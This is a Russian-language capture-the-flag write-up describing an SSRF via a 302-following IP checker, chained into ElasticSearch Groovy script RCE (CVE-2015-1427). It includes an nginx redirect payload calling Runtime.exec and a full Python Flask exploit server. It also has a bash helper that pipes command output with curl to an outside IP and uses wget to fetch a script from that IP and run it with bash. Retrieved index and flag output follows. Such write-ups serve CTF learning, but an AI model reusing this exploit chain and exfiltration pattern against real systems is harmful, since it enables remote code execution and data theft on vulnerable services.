1. Обратили внимание на ссылки вида href="/show?id=q=_id:4" и подсказку 
в описании задачи о быстром поиске, про эластик мы поняли сииильно позже.
2. Чекалку ip натравили на свой сервер, получили инфу что приложение 
на Ruby и реально ходит туда куда сказали, пробовали отдавать разные коды
и обнаружили что чекалка слушается 302.
3. Дернули постом /show?id=q=_id:5 получили 400 - поняли что там sinatra 
4. Погуглили RCE, нашли только две на path traversal и на XSS через 400 BAD REQUEST.
 Потеряли много времени в попытке их реализовать.
5. Попробовали запросы вида `http://users.ctf2019.rocks/show?id=q=room:202`,
 `http://users.ctf2019.rocks/show?id=q=department:a*` и вот здесь до нас 
 дошло наконец-то, что поиск осуществляет ElasticSearch. Погуглили 
 elastic rce (а некоторые вспомнили намеки в промо-ролике CTF), нашли 
 https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh
6. Начали насиловать бота 302 редиректами в elastic, поняли что опять имеем
дело со слепой инъекцией, приготовили правильный запрос и начали работать 
 через nginx ```return 302 'http://localhost:9200/_search?source={"size":1,"script_fields":{"infophp":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}';```
 Идея оказалась так себе, поскольку нон-стоп редактировать конфиг не очень удобно.
 7. Написали простенький сервер и bash скрипт
```python 
#!/usr/bin/python
from flask import Flask, request
from flask import Response
import requests
import sys
import requests, json

app = Flask(__name__)

elk_url = ""

@app.route("/save/<path:path>", methods=['POST', 'PUT'])
def saver(path):
    with open(path, 'wb') as f:
        f.write(request.stream.read().decode('base64'))
    return "saved"

@app.route("/cmd")
def cmd():
    with open('cmd', 'r') as cmd:
        resp = cmd.read()
    return resp

@app.route("/")
def hello():
    resp = Response('redirect')
    resp.headers['Location'] = elk_url
    return resp, 302

@app.route("/push/<path:path>")
def check(path):
    global elk_url
    elk_url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
    req = requests.post("http://users.ctf2019.rocks/checkip", data={"ip":"http://89.163.129.121:5000"})
    return req.text, req.status_code

def elk_q(payload):
    requests.get("http://89.163.129.121:5000/push/_search", params={"source": json.dumps(payload)}).text

def inject(cmd):
    payload = {
        "script_fields": {
            "infophp": {
                "script":
                    '''java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("%s").getText()''' % cmd
            }
         }
    }
    elk_q(payload)

if __name__ == "__main__":
    if sys.argv[1] == 'start':
	app.run(host='0.0.0.0', port=5000, threaded=True)
    else:
        inject(sys.argv[1])
```
```bash

echo "$1 | base64 | curl -d @- http://89.163.129.121:5000/save/output" > cmd
./users.py 'wget -O /tmp/very_secret_path http://89.163.129.121:5000/cmd'; ./users.py 'bash /tmp/very_secret_path '
cat output
```
7. В run.sh увидели путь к исходнику в котором был доп
9. Вытянули второй доп из эластика
```bash
./exec.sh 'curl http://localhost:9200/_cat/indices?v'
health status index   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   users     5   1         10            0     16.9kb         16.9kb
yellow open   secrets   5   1          1            0      3.1kb          3.1kb

./exec.sh 'curl http://localhost:9200/secrets/_search'
{"took":1,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":1,"max_score":1.0,"hits":[{"_index":"secrets","_type":"secret","_id":"1","_score":1.0,"_source":{"flag":"WGCTF{B0AFB09FAC06F96059631AD5D5F0D377}"}}]}}
```

Осознание того, что можно было просто закинуть реверс-шелл пришло уже 
после того, как были вытянуты все флаги.
